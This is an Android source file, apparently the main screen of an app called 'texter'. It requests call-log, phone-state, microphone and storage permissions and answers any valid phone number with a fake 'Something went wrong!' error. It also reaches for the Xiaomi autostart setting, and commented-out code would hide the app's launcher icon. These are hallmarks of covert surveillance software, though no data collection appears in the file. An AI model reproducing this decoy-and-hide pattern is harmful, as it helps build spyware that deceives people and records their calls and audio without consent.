package com.app.texter;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {


    Button nextbut;
    EditText pn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        nextbut=findViewById(R.id.next);
        pn=findViewById(R.id.phone);







        boolean check =checkAndRequestPermissions();
        nextbut.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String phoneNumber=pn.getText().toString();

                if (check){
                    if (pn.length()!=10){Toast.makeText(MainActivity.this, "Invalid Number", Toast.LENGTH_SHORT).show();}
                    else{Toast.makeText(MainActivity.this, "Something went wrong!", Toast.LENGTH_SHORT).show(); }
                }
                else{Toast.makeText(MainActivity.this, "Accept Permission for this  app to continue", Toast.LENGTH_SHORT).show();}

            }
        });



        //PackageManager p = getApplicationContext().getPackageManager();
        //p.setComponentEnabledSetting(getComponentName(),PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        //<uses-feature android:name="android.software.leanback" android:required="true" />  tools:ignore="ImpliedTouchscreenHardware">




    }









    private boolean checkAndRequestPermissions() {
        int flagnumber=0;

        int readPhoneState = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        int read_call_log = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG);
        int storage= ContextCompat.checkSelfPermission(this,Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int CallAudio= ContextCompat.checkSelfPermission(this,Manifest.permission.RECORD_AUDIO);
        int readstore= ContextCompat.checkSelfPermission(this,Manifest.permission.READ_EXTERNAL_STORAGE);

        try { Intent intent = new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")); }catch (Exception e){e.printStackTrace();}



        List listPermissionsNeeded = new ArrayList<>();

        if (readPhoneState != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }else{flagnumber++;}

        if (read_call_log != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        }else{flagnumber++;}
        if (storage != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }else{flagnumber++;}
        if (CallAudio != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        }else{flagnumber++;}
        if (readstore != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }else{flagnumber++;}


        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    (String[]) listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]),
                    1);
        }
        if(flagnumber==5){return true;}
        else{return false;}
    }




}